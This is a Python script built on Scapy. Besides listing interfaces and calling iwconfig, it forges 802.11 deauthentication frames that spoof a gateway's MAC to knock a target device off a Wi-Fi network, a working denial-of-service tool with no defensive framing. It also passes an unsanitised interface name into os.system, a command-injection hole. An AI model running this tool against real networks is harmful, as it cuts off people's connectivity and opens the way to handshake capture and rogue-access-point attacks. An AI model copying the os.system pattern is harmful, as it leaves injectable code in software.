from scapy.all import *
import argparse
import os

def list_interfaces():
    interfaces = get_if_list()
    print("Available network interfaces:")
    for iface in interfaces:
        print(f" - {iface}")

def show_interface_details(interface):
    print(f"\nDetails for interface {interface}:")
    try:
        os.system(f"iwconfig {interface}")
    except Exception as e:
        print(f"Failed to get details for interface {interface}. Error: {e}")

def send_deauth_packets(target_mac, gateway_mac, interface, count):
    deauth_frame = RadioTap() / \
                   Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / \
                   Dot11Deauth(reason=7)
    sendp(deauth_frame, iface=interface, count=count, inter=0.1)

def main():
    parser = argparse.ArgumentParser(description="Network interface and deauthentication utility")
    parser.add_argument("--list", action="store_true", help="List all available network interfaces")
    parser.add_argument("--show", help="Show details for a specific interface")
    parser.add_argument("target_mac", nargs="?", help="Target MAC address (required for deauth)")
    parser.add_argument("gateway_mac", nargs="?", help="Gateway MAC address (required for deauth)")
    parser.add_argument("interface", nargs="?", help="Network interface to use for deauth")
    parser.add_argument("--count", type=int, default=100, help="Number of deauthentication packets to send")
    args = parser.parse_args()

    if args.list:
        list_interfaces()
    elif args.show:
        show_interface_details(args.show)
    elif args.target_mac and args.gateway_mac and args.interface:
        send_deauth_packets(args.target_mac, args.gateway_mac, args.interface, args.count)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
